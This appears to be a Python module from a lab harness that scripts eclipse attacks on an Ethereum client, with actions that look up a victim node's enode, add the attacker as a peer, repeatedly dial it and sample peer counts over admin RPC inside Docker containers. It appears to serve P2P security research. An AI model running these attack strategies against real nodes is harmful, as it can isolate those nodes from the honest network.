"""Eclipse attack strategy DSL — a BunnyFinder-style Action abstraction.

The controller currently ships four built-in scenarios (`stage-a` .. `stage-d`)
that hard-code the attack flow as a single shell script. That works for
fixed reproductions but does not let the operator compose an attack by
describing *what* should happen *when*.

This module ports the BunnyFinder `actionset` design:

  - An `Action` is a single atomic P2P operation an attacker can take
    (dial a peer, send a Ping, fetch a NodeList, sleep N seconds, …).
  - A `Strategy` is a time-ordered sequence of `Action`s, each tagged
    with a `phase` (PREP / ATTACK / SETTLE) and a `t_rel_seconds`
    (relative to strategy start).
  - `Executor` walks the strategy and, for each action, calls back into
    the attacker container over its admin RPC (`net_*, admin_*`).

JSON shape (matches BunnyFinder's `ssf_*.json` family):

    {
      "uid": "stage-b-recipe-001",
      "category": "slot-fill",
      "phases": [
        {"t_rel_seconds": 0,  "phase": "PREP",   "actions": [
            {"name": "resolve_enode",   "params": {"peer": "victim"}},
            {"name": "add_static_peer", "params": {"peer": "victim"}},
            {"name": "wait_peers",      "params": {"min": 1, "timeout": 60}}
        ]},
        {"t_rel_seconds": 30, "phase": "ATTACK", "actions": [
            {"name": "burst_dial",      "params": {"peer": "victim",
                                                    "repeats": 5,
                                                    "interval_s": 3}},
            {"name": "sample_peers",    "params": {}}
        ]}
      ]
    }

The four built-in scenarios are exposed as strategy files under
`profiles/eclipse/strategies/` so `make run` keeps working with no
operator-side changes.
"""
from __future__ import annotations
import json
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Optional


@dataclass
class ActionResult:
    name: str
    success: bool
    started_at: float
    finished_at: float
    detail: dict = field(default_factory=dict)
    error: str | None = None


class Action(ABC):
    """Base class for an Eclipse attack action. Mirrors BunnyFinder's
    `actionset.Action` interface (Name/MaxParam/MinParam/DefaultParam/
    RandomParam/Desc/WithConfig) but adapted for our orchestration
    model: `run(ctx)` performs the action against a context that holds
    the URL of the attacker's admin RPC and any per-strategy state."""

    name: str = "action"
    category: str = "any"  # any / pre-attack / attack / post-attack

    def max_param(self) -> int:
        return 0

    def min_param(self) -> int:
        return 0

    def default_param(self) -> list:
        return []

    def random_param(self) -> list:
        return []

    def desc(self) -> str:
        return ""

    @abstractmethod
    def run(self, ctx: "ExecContext", params: dict) -> ActionResult:
        raise NotImplementedError


# ---- concrete actions ----

class ResolveEnode(Action):
    name = "resolve_enode"
    category = "pre-attack"

    def max_param(self) -> int: return 1
    def min_param(self) -> int: return 0
    def desc(self) -> str:
        return "look up the victim's enode via admin_nodeInfo, cache as ctx.peer_enode"

    def run(self, ctx, params):
        import urllib.request
        body = json.dumps({"jsonrpc": "2.0", "method": "admin_nodeInfo",
                           "params": [], "id": 1}).encode()
        req = urllib.request.Request(
            ctx.victim_rpc, data=body,
            headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=5) as r:
            data = json.loads(r.read())
        enode = data["result"]["enode"]
        # rewrite @ip to match the victim container's docker IP (loopback
        # would make the attacker dial itself)
        real_ip = ctx.victim_ip
        if "@" in enode:
            _, after = enode.split("://", 1)
            pub, _ = after.split("@", 1)
            enode = f"enode://{pub}@{real_ip}:30303"
        ctx.peer_enode = enode
        return ActionResult(self.name, True, time.time(), time.time(),
                            {"enode": enode})


class AddStaticPeer(Action):
    name = "add_static_peer"
    category = "pre-attack"

    def max_param(self) -> int: return 1
    def min_param(self) -> int: return 0
    def desc(self) -> str:
        return "admin_addPeer the resolved enode (persistent trusted peer)"

    def run(self, ctx, params):
        if not ctx.peer_enode:
            raise RuntimeError("add_static_peer requires resolve_enode first")
        import urllib.request
        body = json.dumps({"jsonrpc": "2.0", "method": "admin_addPeer",
                           "params": [ctx.peer_enode], "id": 1}).encode()
        req = urllib.request.Request(
            ctx.attacker_rpc, data=body,
            headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=5) as r:
            data = json.loads(r.read())
        return ActionResult(self.name, bool(data.get("result")), time.time(),
                            time.time(), {"result": data.get("result")})


class WaitPeers(Action):
    name = "wait_peers"
    category = "any"

    def max_param(self) -> int: return 2
    def min_param(self) -> int: return 1
    def desc(self) -> str:
        return "poll admin_peers until >= min, up to timeout seconds"

    def run(self, ctx, params):
        import urllib.request
        mn = int(params.get("min", 1))
        to = float(params.get("timeout", 60))
        deadline = time.time() + to
        last_n = 0
        while time.time() < deadline:
            body = json.dumps({"jsonrpc": "2.0", "method": "admin_peers",
                               "params": [], "id": 1}).encode()
            req = urllib.request.Request(
                ctx.attacker_rpc, data=body,
                headers={"Content-Type": "application/json"})
            try:
                with urllib.request.urlopen(req, timeout=3) as r:
                    peers = json.loads(r.read()).get("result") or []
                last_n = len(peers)
                if last_n >= mn:
                    return ActionResult(self.name, True, time.time(),
                                        time.time(), {"peer_count": last_n})
            except Exception as e:
                ctx.log_event("wait_peers.poll_error", {"error": str(e)})
            time.sleep(2)
        return ActionResult(self.name, False, time.time(), time.time(),
                            {"peer_count": last_n, "timeout_s": to})


class SamplePeers(Action):
    name = "sample_peers"
    category = "any"

    def desc(self) -> str:
        return "snapshot admin_peers + net_peerCount and record to events"

    def run(self, ctx, params):
        import urllib.request
        def _rpc(method, target):
            body = json.dumps({"jsonrpc": "2.0", "method": method,
                               "params": [], "id": 1}).encode()
            req = urllib.request.Request(
                target, data=body,
                headers={"Content-Type": "application/json"})
            with urllib.request.urlopen(req, timeout=5) as r:
                return json.loads(r.read()).get("result")

        peers = _rpc("admin_peers", ctx.attacker_rpc) or []
        npc = _rpc("net_peerCount", ctx.attacker_rpc)
        npc_v = _rpc("net_peerCount", ctx.victim_rpc)
        snap = {
            "t": time.time(),
            "attacker_peers": len(peers),
            "victim_peer_count": int(npc_v or 0, 16) if isinstance(npc_v, str) else npc_v,
        }
        ctx.log_event("sample_peers.snapshot", snap)
        return ActionResult(self.name, True, time.time(), time.time(), snap)


class BurstDial(Action):
    name = "burst_dial"
    category = "attack"

    def max_param(self) -> int: return 3
    def min_param(self) -> int: return 1
    def desc(self) -> str:
        return "fire N admin_addPeer calls with a sleep between each"

    def run(self, ctx, params):
        if not ctx.peer_enode:
            raise RuntimeError("burst_dial requires resolve_enode first")
        n = int(params.get("repeats", 3))
        gap = float(params.get("interval_s", 2))
        import urllib.request
        successes = 0
        for i in range(n):
            body = json.dumps({"jsonrpc": "2.0", "method": "admin_addPeer",
                               "params": [ctx.peer_enode], "id": 1}).encode()
            req = urllib.request.Request(
                ctx.attacker_rpc, data=body,
                headers={"Content-Type": "application/json"})
            try:
                with urllib.request.urlopen(req, timeout=3) as r:
                    if json.loads(r.read()).get("result"):
                        successes += 1
            except Exception:
                pass
            ctx.log_event("burst_dial.tick", {"i": i, "successes": successes})
            time.sleep(gap)
        return ActionResult(self.name, successes > 0, time.time(), time.time(),
                            {"sent": n, "ok": successes})


class Sleep(Action):
    name = "sleep"
    category = "any"

    def max_param(self) -> int: return 1
    def min_param(self) -> int: return 1
    def desc(self) -> str:
        return "sleep N seconds"

    def run(self, ctx, params):
        s = float(params.get("seconds", 1))
        time.sleep(s)
        return ActionResult(self.name, True, time.time(), time.time(),
                            {"slept_s": s})


# ---- registry (singleton instances — Action.run must be called on the
# existing instance, never instantiated twice, because some subclasses
# mutate `self` across calls) ----

_RESOLVE_ENODE = ResolveEnode()
_ADD_STATIC_PEER = AddStaticPeer()
_WAIT_PEERS = WaitPeers()
_SAMPLE_PEERS = SamplePeers()
_BURST_DIAL = BurstDial()
_SLEEP = Sleep()

_REGISTRY: dict[str, Action] = {
    "resolve_enode":   _RESOLVE_ENODE,
    "add_static_peer": _ADD_STATIC_PEER,
    "wait_peers":      _WAIT_PEERS,
    "sample_peers":    _SAMPLE_PEERS,
    "burst_dial":      _BURST_DIAL,
    "sleep":           _SLEEP,
}


def get_action(name: str) -> Action:
    if name not in _REGISTRY:
        raise KeyError(f"unknown eclipse action {name!r}; "
                       f"available: {sorted(_REGISTRY)}")
    return _REGISTRY[name]


# ---- executor ----

@dataclass
class ExecContext:
    attacker_rpc: str
    victim_rpc: str
    victim_ip: str
    peer_enode: Optional[str] = None
    log_sink: Optional[Callable[[str, dict], None]] = None

    def log_event(self, kind: str, payload: dict) -> None:
        if self.log_sink:
            self.log_sink(kind, payload)


@dataclass
class StrategyStep:
    t_rel_seconds: float
    phase: str
    actions: list[dict]   # [{"name": "...", "params": {...}}, ...]


@dataclass
class Strategy:
    uid: str
    category: str
    steps: list[StrategyStep]

    @classmethod
    def from_json_file(cls, p: Path) -> "Strategy":
        return cls.from_dict(json.loads(p.read_text()))

    @classmethod
    def from_dict(cls, d: dict) -> "Strategy":
        steps = []
        for raw in d.get("phases", []):
            steps.append(StrategyStep(
                t_rel_seconds=float(raw.get("t_rel_seconds", 0)),
                phase=raw.get("phase", "ATTACK"),
                actions=raw.get("actions", []),
            ))
        return cls(uid=d.get("uid", ""), category=d.get("category", ""),
                   steps=steps)


class Executor:
    """Walks a Strategy sequentially, honouring t_rel_seconds, and
    returns a list of ActionResults."""

    def __init__(self, ctx: ExecContext, log_sink=None):
        self.ctx = ctx
        self.log_sink = log_sink

    def run(self, strat: Strategy) -> list[ActionResult]:
        results: list[ActionResult] = []
        t0 = time.time()
        for step in strat.steps:
            wait = (t0 + step.t_rel_seconds) - time.time()
            if wait > 0:
                time.sleep(wait)
            self.log_sink and self.log_sink(
                "strategy.phase", {"phase": step.phase,
                                   "t_rel_seconds": step.t_rel_seconds})
            for ad in step.actions:
                a = get_action(ad["name"])
                params = ad.get("params", {})
                self.log_sink and self.log_sink(
                    "strategy.action.start",
                    {"name": a.name, "phase": step.phase,
                     "t_rel": step.t_rel_seconds, "params": params})
                res = a.run(self.ctx, params)
                self.log_sink and self.log_sink(
                    "strategy.action.done",
                    {"name": a.name, "ok": res.success,
                     "error": res.error, **res.detail})
                results.append(res)
        return results


# ---- built-in strategy builders (preserve existing scenarios) ----

def stage_b_strategy(n_attackers: int = 8) -> dict:
    return {
        "uid": f"stage-b-recipe-{n_attackers}",
        "category": "slot-fill",
        "phases": [
            {"t_rel_seconds": 0, "phase": "PREP", "actions": [
                {"name": "sleep", "params": {"seconds": 5}},
                {"name": "resolve_enode", "params": {}},
                {"name": "add_static_peer", "params": {}},
                {"name": "wait_peers", "params": {"min": 1, "timeout": 90}},
            ]},
            {"t_rel_seconds": 30, "phase": "ATTACK", "actions": [
                {"name": "burst_dial",
                 "params": {"repeats": 6, "interval_s": 4}},
            ]},
            {"t_rel_seconds": 75, "phase": "SETTLE", "actions": [
                {"name": "sample_peers", "params": {}},
            ]},
        ],
    }


def stage_a_strategy() -> dict:
    return {
        "uid": "stage-a-recipe",
        "category": "single-attacker",
        "phases": [
            {"t_rel_seconds": 0, "phase": "PREP", "actions": [
                {"name": "sleep", "params": {"seconds": 5}},
                {"name": "resolve_enode", "params": {}},
                {"name": "add_static_peer", "params": {}},
                {"name": "wait_peers", "params": {"min": 1, "timeout": 90}},
            ]},
            {"t_rel_seconds": 30, "phase": "SETTLE", "actions": [
                {"name": "sample_peers", "params": {}},
            ]},
        ],
    }


def stage_d_strategy() -> dict:
    """Stage-d: attacker only needs to be alive and listen on 30303.
    No dial needed — victim dials it via StaticNodes."""
    return {
        "uid": "stage-d-recipe",
        "category": "db-pre-fill",
        "phases": [
            {"t_rel_seconds": 0, "phase": "PREP", "actions": [
                {"name": "sleep", "params": {"seconds": 10}},
            ]},
            {"t_rel_seconds": 60, "phase": "SETTLE", "actions": [
                {"name": "sample_peers", "params": {}},
            ]},
        ],
    }
# ---- docker-exec executor ----

class DockerExecExecutor(Executor):
    """Executor variant that reaches the attacker / victim through
    `docker exec <attacker_container> wget ...` instead of opening a
    HTTP socket from the host. Required because the controller runs
    on the host outside the docker network."""

    def __init__(self, ctx: ExecContext, container: str,
                 run_dir, attacker_idx: int):
        super().__init__(ctx)
        self.container = container
        self.run_dir = run_dir
        self.attacker_idx = attacker_idx
        self._target_rpc = {'attacker': '127.0.0.1:8545',
                            'victim':   'victim:8545'}

    def _rpc(self, target: str, method: str, params):
        import subprocess
        host_port = self._target_rpc[target]
        body = json.dumps({'jsonrpc': '2.0', 'method': method,
                           'params': params, 'id': 1})
        # subprocess.run with list args avoids shell-level quoting of the
        # JSON body — geth rejects parse errors with rc=0 and an error
        # response, so we cannot use sh() string concatenation here.
        proc = subprocess.run([
            'docker', 'exec', self.container,
            'wget', '-qO-', '--timeout=5',
            '--post-data=' + body,
            '--header=Content-Type: application/json',
            f'http://{host_port}'],
            capture_output=True, text=True, timeout=15)
        if proc.returncode != 0:
            raise RuntimeError(
                f'docker exec failed: rc={proc.returncode} '
                f'err={proc.stderr[-100:]}')
        try:
            return json.loads(proc.stdout).get('result')
        except Exception as e:
            raise RuntimeError(f'parse error: {proc.stdout[:200]} ({e})')

    def run(self, strat):
        # Monkey-patch the registry so each action's `run` method uses
        # this executor's RPC helper instead of urllib. We replace them
        # inline rather than subclassing each Action to keep the
        # surface tiny.
        import eclipse_strategy as _self
        orig_resolve  = _RESOLVE_ENODE.run
        orig_add      = _ADD_STATIC_PEER.run
        orig_wait     = _WAIT_PEERS.run
        orig_sample   = _SAMPLE_PEERS.run
        orig_burst    = _BURST_DIAL.run
        try:
            def _patched_resolve(ctx, params):
                data = self._rpc('victim', 'admin_nodeInfo', [])
                enode = data['enode']
                if '@' in enode:
                    _, after = enode.split('://', 1)
                    pub, _ = after.split('@', 1)
                    enode = f'enode://{pub}@{ctx.victim_ip}:30303'
                ctx.peer_enode = enode
                return ActionResult('resolve_enode', True, time.time(),
                                    time.time(), {'enode': enode})
            def _patched_add(ctx, params):
                if not ctx.peer_enode:
                    return ActionResult('add_static_peer', False, time.time(),
                                        time.time(), error='no peer_enode')
                data = self._rpc('attacker', 'admin_addPeer',
                                 [ctx.peer_enode])
                return ActionResult('add_static_peer', bool(data), time.time(),
                                    time.time(), {'result': data})
            def _patched_wait(ctx, params):
                mn = int(params.get('min', 1))
                to = float(params.get('timeout', 60))
                deadline = time.time() + to
                last_n = 0
                while time.time() < deadline:
                    try:
                        peers = self._rpc('attacker', 'admin_peers', []) or []
                        last_n = len(peers)
                        if last_n >= mn:
                            return ActionResult('wait_peers', True,
                                time.time(), time.time(),
                                {'peer_count': last_n})
                    except Exception:
                        pass
                    time.sleep(2)
                return ActionResult('wait_peers', False, time.time(),
                                    time.time(),
                                    {'peer_count': last_n, 'timeout_s': to})
            def _patched_sample(ctx, params):
                try:
                    peers = self._rpc('attacker', 'admin_peers', []) or []
                    npc   = self._rpc('attacker', 'net_peerCount', [])
                    npc_v = self._rpc('victim',   'net_peerCount', [])
                    snap = {'t': time.time(),
                            'attacker_peers': len(peers),
                            'victim_peer_count': int(npc_v, 16)
                                if isinstance(npc_v, str) else npc_v}
                except Exception as e:
                    return ActionResult('sample_peers', False, time.time(),
                                        time.time(), error=str(e))
                ctx.log_event('sample_peers.snapshot', snap)
                return ActionResult('sample_peers', True, time.time(),
                                    time.time(), snap)
            def _patched_burst(ctx, params):
                if not ctx.peer_enode:
                    return ActionResult('burst_dial', False, time.time(),
                                        time.time(), error='no peer_enode')
                n   = int(params.get('repeats', 3))
                gap = float(params.get('interval_s', 2))
                ok  = 0
                for i in range(n):
                    try:
                        if self._rpc('attacker', 'admin_addPeer',
                                     [ctx.peer_enode]):
                            ok += 1
                    except Exception:
                        pass
                    ctx.log_event('burst_dial.tick',
                                  {'i': i, 'successes': ok})
                    time.sleep(gap)
                return ActionResult('burst_dial', ok > 0, time.time(),
                                    time.time(), {'sent': n, 'ok': ok})

            _RESOLVE_ENODE.run  = _patched_resolve
            _ADD_STATIC_PEER.run = _patched_add
            _WAIT_PEERS.run     = _patched_wait
            _SAMPLE_PEERS.run   = _patched_sample
            _BURST_DIAL.run     = _patched_burst
            return super().run(strat)
        finally:
            _RESOLVE_ENODE.run  = orig_resolve
            _ADD_STATIC_PEER.run = orig_add
            _WAIT_PEERS.run     = orig_wait
            _SAMPLE_PEERS.run   = orig_sample
            _BURST_DIAL.run     = orig_burst
